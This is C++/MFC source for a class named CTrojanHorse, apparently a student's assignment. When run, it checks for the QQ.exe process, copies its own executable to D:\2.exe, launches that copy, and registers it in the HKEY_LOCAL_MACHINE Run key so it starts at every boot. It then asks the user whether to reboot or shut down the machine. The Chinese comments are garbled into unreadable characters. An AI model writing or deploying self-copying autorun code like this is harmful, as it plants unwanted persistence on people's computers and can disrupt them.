#include "AFX.h" 
#include "tlhelp32.h" 
#include "AFXWIN.h"
#include "windows.h"
#include "shellapi.h"
#include "iostream"
#include "stdlib.h"
using namespace std;
class CTrojanHorse  
{  
	public://add code 
	public://add code  
	CTrojanHorse();  
	~CTrojanHorse();  
	protected://add code  
	BOOL IfShell(CString BeKissPrcName);  
	BOOL CopyFileaddr(CString m_CopyFile); 
	BOOL EnableShutDownPrivilege(BOOL bEnable);
	void ShellFile(CString m_ShellFile);  
	BOOL SetAutoRun(CString strPath);  
	void ShutDown();      
	private://add code  
}; 
CTrojanHorse::CTrojanHorse()
{
	MessageBox(0, "This is Thomas's assignment!", "Warning!!!" , MB_ICONINFORMATION|MB_OK);
	EnableShutDownPrivilege(1);
}
CTrojanHorse::~CTrojanHorse()
{}
 BOOL CTrojanHorse::EnableShutDownPrivilege(BOOL bEnable)
{
// ������������Ȩ���Ա����ϵͳ����
	BOOL bOk = FALSE; 
	HANDLE hToken;
// ��һ�����̵ķ�������
	if(::OpenProcessToken(::GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken)) 
	{
// ȡ����Ȩ����Ϊ��SetDebugPrivilege����LUID
		LUID uID;
		::LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME, &uID);
// ������Ȩ����
		TOKEN_PRIVILEGES tp;
		tp.PrivilegeCount = 1;
		tp.Privileges[0].Luid = uID;
		tp.Privileges[0].Attributes = bEnable ? SE_PRIVILEGE_ENABLED : 0;
		::AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
		bOk = (::GetLastError() == ERROR_SUCCESS);
// �رշ������ƾ��
		::CloseHandle(hToken);
	}
	return bOk;
}
BOOL CTrojanHorse::IfShell(CString BeKissPrcName)//�жϳ����Ƿ�������  
{  
       CString str,a,prcnum;  
       // CMainFrame *pDlg=(CMainFrame *)lparam;  
      //AfxMessageBox(pDlg->BeKissPrcName);  
       HANDLE SnapShot=CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);  
       SHFILEINFO shSmall;  
       PROCESSENTRY32 ProcessInfo;//����������Ϣ����  
       ProcessInfo.dwSize=sizeof(ProcessInfo);//����ProcessInfo�Ĵ�С  
   //����ϵͳ�е�һ�����̵���Ϣ  
   BOOL Status=Process32First(SnapShot,&ProcessInfo);  
   int m_nProcess=0;  
   int num=0;  
   while(Status) 
   {
	   num++;  
		m_nProcess++;  
		ZeroMemory(&shSmall,sizeof(shSmall));//��ȡ�����ļ���Ϣ  
		SHGetFileInfo(ProcessInfo.szExeFile,0,&shSmall,  
		sizeof(shSmall),SHGFI_ICON|SHGFI_SMALLICON);  
		//str.Format("%08x",ProcessInfo.th32ProcessID);  
		str=ProcessInfo.szExeFile;  
		if(str==BeKissPrcName)  
		{  
			AfxMessageBox("�ҵ����̳ɹ�!"); 
			return true; 
		} 
//��ȡ��һ�����̵���Ϣ  
		Status=Process32Next(SnapShot,&ProcessInfo);  
   }  
   AfxMessageBox("ʧ��!");  
   return false;  
}  
BOOL CTrojanHorse::CopyFileaddr(CString m_CopyFile)//�����ļ�  
{	
/*	CString m_addr;
	char pBuf[MAX_PATH];                                               //���·���ı���
	GetCurrentDirectory(MAX_PATH,pBuf);                   //��ȡ����ĵ�ǰĿ¼
	strcat(pBuf,"\\");
	strcat(pBuf,AfxGetApp()->m_pszExeName);   
	strcat(pBuf,".cpp");     
	m_addr=pBuf;*/ 
	if(CopyFile(_pgmptr,m_CopyFile,FALSE))  
   {  
		AfxMessageBox("���Ƴɹ���");  
		return true;  
   }  
	return false;  
}  
void CTrojanHorse::ShellFile(CString m_ShellFile)//ִ����Ҫ�ĳ���  
{  
	ShellExecute(NULL,"open",m_ShellFile,NULL,NULL,SW_SHOWNORMAL);  
}  
BOOL CTrojanHorse::SetAutoRun(CString strPath)//�޸�ע���  
{  
       CString str;    
       HKEY hRegKey;    
       BOOL bResult;    
       str=_T("Software\\Microsoft\\Windows\\CurrentVersion\\Run");    
       if(RegOpenKey(HKEY_LOCAL_MACHINE, str, &hRegKey) != ERROR_SUCCESS)   
            bResult=FALSE;    
       else    
       {    
            _splitpath(strPath.GetBuffer(0),NULL,NULL,str.GetBufferSetLength(MAX_PATH+1),NULL);    
            strPath.ReleaseBuffer();    
            str.ReleaseBuffer();    
            if(::RegSetValueEx( hRegKey,    
                                     str,    
                                     0,    
                                     REG_SZ,    
                                     (CONST BYTE *)strPath.GetBuffer(0),    
                                     strPath.GetLength() ) != ERROR_SUCCESS)    
                  bResult=FALSE;    
            else    
                  bResult=TRUE;    
            strPath.ReleaseBuffer();    
       }    
       return bResult;  
}  

void CTrojanHorse::ShutDown()//�������������  
{  
	if (IDYES == MessageBox(NULL,"�Ƿ��������������������", "ע�����ʾ", MB_YESNO))  
	{  
		OSVERSIONINFO OsVerInfo; //����ϵͳ�汾��Ϣ�����ݽṹ  
		OsVerInfo.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);  
		GetVersionEx(&OsVerInfo);//ȡ��ϵͳ�İ汾��Ϣ  
		CString str1 = "", str2 = "";  
		str1.Format("���ϵͳ��Ϣ\n�汾Ϊ��%d.%d\n", OsVerInfo.dwMajorVersion,  
		OsVerInfo.dwMinorVersion);  
		str2.Format("�ͺţ�%d\n", OsVerInfo.dwBuildNumber);  
		str1 += str2;  
		AfxMessageBox(str1);  
		if(OsVerInfo.dwPlatformId == VER_PLATFORM_WIN32_NT)  
			ExitWindowsEx(EWX_REBOOT | EWX_SHUTDOWN, 0); //�������������(Ȩ�޲������޷��ػ�)  
	}  
}
class thomas:public CTrojanHorse
{
public:
	thomas();
	~thomas();
};
thomas::thomas()
{
	bool a;
	a=IfShell("QQ.exe");
	a=CopyFileaddr("D:\\2.exe");
	ShellFile("D:\\2.exe");
	a=SetAutoRun("D:\\2.exe");
	ShutDown();
}
thomas::~thomas()
{}
int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,LPSTR lpCmdLine,int nCmdShow)
{
	thomas v1;
	return 0;
}
